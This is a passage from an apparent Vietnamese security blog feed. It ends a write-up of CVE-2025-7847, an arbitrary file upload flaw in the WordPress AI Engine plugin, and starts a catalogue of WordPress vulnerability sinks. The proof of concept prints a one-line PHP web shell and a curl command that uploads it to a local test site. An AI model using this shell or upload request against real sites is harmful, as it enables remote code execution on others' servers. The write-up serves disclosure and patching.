$this-&amp;gt;core-&amp;gt;files-&amp;gt;upload_file(&#xA;        $file[&amp;#39;tmp_name&amp;#39;],&#xA;        $file[&amp;#39;name&amp;#39;],&#xA;        $purpose,&#xA;        $metadata,&#xA;        null, // envId&#xA;        $target,&#xA;        $ttl&#xA;      );&#xA;      &#xA;      $url = $this-&amp;gt;core-&amp;gt;files-&amp;gt;get_url( $refId );&#xA;      &#xA;      return [&#xA;        &amp;#39;id&amp;#39; =&amp;gt; $refId,&#xA;        &amp;#39;url&amp;#39; =&amp;gt; $url&#xA;      ];&#xA;    }&#xA;    else {&#xA;      throw new Exception( &amp;#39;Either a file or base64 data must be provided.&amp;#39; );&#xA;    }&#xA;  }&#xA;  catch ( Exception $e ) {&#xA;    throw new Exception( &amp;#39;File upload failed: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;simpleFileUpload()&lt;/code&gt; th·ª±c hi·ªán upload file ho·∫∑c d·ªØ li·ªáu base64.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;$base64&lt;/code&gt; kh√¥ng r·ªóng ‚Üí x·ª≠ l√Ω upload t·ª´ base64.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;$file&lt;/code&gt; l√† m·∫£ng h·ª£p l·ªá:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ki·ªÉm tra l·ªói upload (&lt;code&gt;$file[&#39;error&#39;]&lt;/code&gt;) ‚Üí n√©m Exception n·∫øu c√≥ l·ªói.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;upload_file()&lt;/code&gt; ƒë·ªÉ l∆∞u file.&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y URL file qua &lt;code&gt;$this-&amp;gt;core-&amp;gt;files-&amp;gt;get_url($refId)&lt;/code&gt; v√† tr·∫£ v·ªÅ m·∫£ng &lt;code&gt;[&#39;id&#39; =&amp;gt; $refId, &#39;url&#39; =&amp;gt; $url]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function upload_file($path,$filename = null,$purpose = null,$metadata = null,$envId = null,$target = null,$expiry = null) {&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/image.php&amp;#39; );&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;  require_once( ABSPATH . &amp;#39;wp-admin/includes/media.php&amp;#39; );&#xA;&#xA;  $target = empty( $target ) ? $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;image_local_upload&amp;#39; ) : $target;&#xA;  $expiry = empty( $expiry ) ? $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;image_expires&amp;#39; ) : $expiry;&#xA;&#xA;  $expires = ( $expiry === &amp;#39;never&amp;#39; || empty( $expiry ) ) ? null : date( &amp;#39;Y-m-d H:i:s&amp;#39;, time() &amp;#43; intval( $expiry ) );&#xA;  $refId = $this-&amp;gt;generate_refId();&#xA;  $url = null;&#xA;  if ( empty( $filename ) ) {&#xA;    $parsed_url = parse_url( $path, PHP_URL_PATH );&#xA;    $filename = basename( $parsed_url );&#xA;    $extension = pathinfo( $filename, PATHINFO_EXTENSION );&#xA;  }&#xA;  else {&#xA;    $extension = pathinfo( $filename, PATHINFO_EXTENSION );&#xA;  }&#xA;  $newFilename = $refId . &amp;#39;.&amp;#39; . $extension;&#xA;  $unique_filename = wp_unique_filename( wp_upload_dir()[&amp;#39;path&amp;#39;], $newFilename );&#xA;  $destination = wp_upload_dir()[&amp;#39;path&amp;#39;] . &amp;#39;/&amp;#39; . $unique_filename;&#xA;&#xA;  if ( $target === &amp;#39;uploads&amp;#39; ) {&#xA;    if ( !$this-&amp;gt;check_db() ) {&#xA;      throw new Exception( &amp;#39;Could not create database table.&amp;#39; );&#xA;    }&#xA;    if ( !copy( $path, $destination ) ) {&#xA;      throw new Exception( &amp;#39;Could not move the file.&amp;#39; );&#xA;    }&#xA;    $url = wp_upload_dir()[&amp;#39;url&amp;#39;] . &amp;#39;/&amp;#39; . $unique_filename;&#xA;&#xA;    $now = date( &amp;#39;Y-m-d H:i:s&amp;#39; );&#xA;    $fileId = $this-&amp;gt;commit_file( [&#xA;      &amp;#39;refId&amp;#39; =&amp;gt; $refId,&#xA;      &amp;#39;envId&amp;#39; =&amp;gt; $envId,&#xA;      &amp;#39;purpose&amp;#39; =&amp;gt; $purpose,&#xA;      &amp;#39;type&amp;#39; =&amp;gt; null,&#xA;      &amp;#39;status&amp;#39; =&amp;gt; &amp;#39;uploaded&amp;#39;,&#xA;      &amp;#39;created&amp;#39; =&amp;gt; $now,&#xA;      &amp;#39;updated&amp;#39; =&amp;gt; $now,&#xA;      &amp;#39;expires&amp;#39; =&amp;gt; $expires,&#xA;      &amp;#39;path&amp;#39; =&amp;gt; $destination,&#xA;      &amp;#39;url&amp;#39; =&amp;gt; $url&#xA;    ] );&#xA;    if ( $metadata &amp;amp;&amp;amp; is_array( $metadata ) ) {&#xA;      foreach ( $metadata as $metaKey =&amp;gt; $metaValue ) {&#xA;        $this-&amp;gt;add_metadata( $fileId, $metaKey, $metaValue );&#xA;      }&#xA;    }&#xA;&#xA;  }&#xA;  else if ( $target === &amp;#39;library&amp;#39; ) {&#xA;&#xA;    if ( filter_var( $path, FILTER_VALIDATE_URL ) ) {&#xA;      $tmp = download_url( $path );&#xA;      if ( is_wp_error( $tmp ) ) {&#xA;        throw new Exception( $tmp-&amp;gt;get_error_message() );&#xA;      }&#xA;      $file_array = [ &amp;#39;name&amp;#39; =&amp;gt; $unique_filename, &amp;#39;tmp_name&amp;#39; =&amp;gt; $tmp ];&#xA;    }&#xA;    else {&#xA;      $file_array = [ &amp;#39;name&amp;#39; =&amp;gt; $unique_filename, &amp;#39;tmp_name&amp;#39; =&amp;gt; $path ];&#xA;    }&#xA;&#xA;    $id = media_handle_sideload( $file_array, 0 );&#xA;    if ( is_wp_error( $id ) ) {&#xA;      throw new Exception( $id-&amp;gt;get_error_message() );&#xA;    }&#xA;&#xA;    $url = wp_get_attachment_url( $id );&#xA;    update_post_meta( $id, &amp;#39;_mwai_file_id&amp;#39;, $refId );&#xA;    update_post_meta( $id, &amp;#39;_mwai_file_expires&amp;#39;, $expires );&#xA;&#xA;    // Store additional metadata&#xA;    if ( $metadata &amp;amp;&amp;amp; is_array( $metadata ) ) {&#xA;      foreach ( $metadata as $metaKey =&amp;gt; $metaValue ) {&#xA;        update_post_meta( $id, &amp;#39;_mwai_&amp;#39; . $metaKey, $metaValue );&#xA;      }&#xA;    }&#xA;&#xA;    // Store purpose and envId as post meta&#xA;    if ( $purpose ) {&#xA;      update_post_meta( $id, &amp;#39;_mwai_purpose&amp;#39;, $purpose );&#xA;    }&#xA;    if ( $envId ) {&#xA;      update_post_meta( $id, &amp;#39;_mwai_envId&amp;#39;, $envId );&#xA;    }&#xA;  }&#xA;&#xA;  return $refId;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;upload_file()&lt;/code&gt; x·ª≠ l√Ω upload file v√† ƒë·∫∑t t√™n file nh∆∞ sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;X√°c ƒë·ªãnh t√™n v√† ph·∫ßn m·ªü r·ªông: n·∫øu &lt;code&gt;$filename&lt;/code&gt; kh√¥ng cung c·∫•p, l·∫•y t√™n file t·ª´ &lt;code&gt;$path&lt;/code&gt; v√† gi·ªØ ph·∫ßn m·ªü r·ªông ƒë·ªÉ ƒë√∫ng ƒë·ªãnh d·∫°ng.&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o t√™n file duy nh·∫•t b·∫±ng c√°ch gh√©p &lt;code&gt;$refId&lt;/code&gt; v·ªõi ph·∫ßn m·ªü r·ªông, r·ªìi d√πng &lt;code&gt;wp_unique_filename()&lt;/code&gt; ƒë·ªÉ tr√°nh tr√πng t√™n trong th∆∞ m·ª•c l∆∞u tr·ªØ.&lt;/li&gt;&#xA;&lt;li&gt;L∆∞u file: n·∫øu &lt;code&gt;$target === &#39;uploads&#39;&lt;/code&gt; th√¨ copy v√†o th∆∞ m·ª•c uploads, n·∫øu &lt;code&gt;$target === &#39;library&#39;&lt;/code&gt; th√¨ th√™m v√†o Media Library b·∫±ng &lt;code&gt;media_handle_sideload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ &lt;code&gt;$refId&lt;/code&gt;. File ƒë∆∞·ª£c l∆∞u v·ªõi t√™n &lt;code&gt;&amp;lt;refId&amp;gt;.&amp;lt;extension&amp;gt;&lt;/code&gt; trong th∆∞ m·ª•c uploads ho·∫∑c Media Library, k√®m metadata n·∫øu c√≥.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-json/mwai/v1/simpleFileUpload&amp;#34;] --&amp;gt; B{&amp;#34;permission_callback&amp;#34;}&#xA;B -- Authenticated (X-WP-Nonce or Bearer) --&amp;gt; C[&amp;#34;rest_simpleFileUpload()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;simpleFileUpload()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;files-&amp;gt;upload_file(tmp_name, name, target, ...)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Determine extension ‚Üí newFilename = refId.extension&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;target === &amp;#39;uploads&amp;#39; ?&amp;#34;}&#xA;G -- Yes --&amp;gt; H[&amp;#34;copy(path, destination) ‚Üí file placed in uploads&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;No filetype validation&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;Uploaded .php accessible via URL&amp;#34;]&#xA;J --&amp;gt; L[&amp;#34;Response contain URL to file&amp;#34;]&#xA;L --&amp;gt; K[&amp;#34;Execute PHP ‚Üí Remote Code Execution (RCE)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Upload web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST \&#xA;  &amp;#34;http://localhost/wp-json/mwai/v1/simpleFileUpload&amp;#34; \&#xA;  -H &amp;#34;X-WP-Nonce: 51e6c4a45a&amp;#34; \&#xA;  -F &amp;#34;file=@rce.php&amp;#34; \&#xA;  -b &amp;#34;wp-settings-time-1=1762427921;&#xA;      wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce;&#xA;      wordpress_test_cookie=WP%20Cookie%20check;&#xA;      PHPSESSID=9d30c6b076551e37fb4ed7968fd5de98;&#xA;      wp_lang=en_US;&#xA;      wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762706307%7C3gOEpWVViHcurttDwNTWxn1b5CWvZGdOajkR5cjzW3e%7Cda0f415f7f042d4095dbeac711e1742cc23db9ea1d020adbae5c385a36b65b98;&#xA;      wp-settings-5=mfold%3Do;&#xA;      wp-settings-time-5=1762533510&amp;#34; \&#xA;  --proxy 127.0.0.1:8080 # Burp proxy&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#34; title=&#34;Upload file th√†nh c√¥ng&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Upload&lt;/h2&gt;&lt;p&gt;Upload file th√†nh c√¥ng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/upload.png&#39; alt=&#34;Upload&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Upload file th√†nh c√¥ng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;RCE v·ªõi web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-13-cve-2025-7847/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-13-cve-2025-7847/result.png&#39; alt=&#34;Result&#34; height=&#34;573&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-7847 l√† l·ªó h·ªïng &lt;strong&gt;arbitrary file upload&lt;/strong&gt; nghi√™m tr·ªçng trong plugin &lt;strong&gt;AI Engine 2.9.3‚Äì2.9.4&lt;/strong&gt;, cho ph√©p user ƒë√£ x√°c th·ª±c (Subscriber+) upload file b·∫•t k·ª≥ l√™n server qua REST API, d·∫´n t·ªõi &lt;strong&gt;RCE&lt;/strong&gt;. B·∫£n v√° 2.9.5 kh·∫Øc ph·ª•c b·∫±ng ki·ªÉm tra lo·∫°i file (&lt;code&gt;wp_check_filetype&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;L·ªó h·ªïng ch·ªâ ·∫£nh h∆∞·ªüng khi &lt;strong&gt;REST API Public b·∫≠t&lt;/strong&gt; v√† user c√≥ &lt;strong&gt;X-WP-Nonce h·ª£p l·ªá&lt;/strong&gt; ho·∫∑c Bearer token.&lt;/li&gt;&#xA;&lt;li&gt;Nguy√™n nh√¢n: &lt;strong&gt;thi·∫øu ki·ªÉm tra lo·∫°i file&lt;/strong&gt; v√† copy file tr·ª±c ti·∫øp v√†o uploads.&lt;/li&gt;&#xA;&lt;li&gt;Gi·∫£i ph√°p: &lt;strong&gt;c·∫≠p nh·∫≠t plugin l√™n 2.9.5&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-2-9-3-2-9-4-authenticated-subscriber-arbitrary-file-upload&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin 2.9.3-2.9.4 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Vulnerability Sinks</title>
      <link>http://localhost:1313/vi/posts/2025-11-13-wordpress-vulnerability-sink/</link>
      <pubDate>Thu, 13 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-13-wordpress-vulnerability-sink/</guid>
      <category domain="http://localhost:1313/vi/categories/bug-bounty/">Bug Bounty</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-this-article&#34;&gt;&lt;span&gt;Why This Article?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-this-article&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Trong qu√° tr√¨nh pentest vi·ªác &lt;strong&gt;x√°c ƒë·ªãnh c√°c ƒëi·ªÉm sink&lt;/strong&gt; l√† b∆∞·ªõc then ch·ªët ‚Äî ƒë√≥ l√† n∆°i d·ªØ li·ªáu ƒë·∫ßu v√†o (user-controlled) th·ª±c s·ª± ƒë∆∞·ª£c ti√™u th·ª• v√† c√≥ kh·∫£ nƒÉng g√¢y ra h√†nh vi ƒë·ªôc h·∫°i (RCE, SQLi, XSS, file write, v.v.). M·ªói l·ªó h·ªïng th∆∞·ªùng li√™n quan ƒë·∫øn m·ªôt ho·∫∑c nhi·ªÅu sink; n·∫øu ch·ªâ t√¨m input kh√¥ng th√¥i th√¨ d·ªÖ b·ªè s√≥t ƒë∆∞·ªùng d·∫´n th·ª±c thi.&lt;/p&gt;&#xA;&lt;p&gt;M·ª•c ti√™u c·ªßa b√†i vi·∫øt n√†y l√†: T·ªïng h·ª£p t·∫≠p trung c√°c &lt;strong&gt;sink&lt;/strong&gt; th∆∞·ªùng g·∫∑p trong WordPress ƒë·ªÉ d·ªÖ tra c·ª©u.&lt;/p&gt;&#xA;&lt;p&gt;B·∫±ng c√°ch c√≥ m·ªôt ‚Äúb·∫£n ƒë·ªì sink‚Äù r√µ r√†ng, pentester, CVE analyst v√† developer s·∫Ω ti·∫øp c·∫≠n l·ªó h·ªïng hi·ªáu qu·∫£ h∆°n ‚Äî t·ª´ ph√°t hi·ªán t·ªõi kh·∫Øc ph·ª•c.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;wordpress-sink-catalog&#34;&gt;&lt;span&gt;WordPress Sink Catalog&lt;/span&gt;&#xA;  &lt;a href=&#34;#wordpress-sink-catalog&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;sql-injection-sqli&#34;&gt;&lt;span&gt;SQL Injection (SQLi)&lt;/span&gt;&#xA;  &lt;a href=&#34;#sql-injection-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/query/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;$wpdb-&amp;gt;query&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wpdb/get_var/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 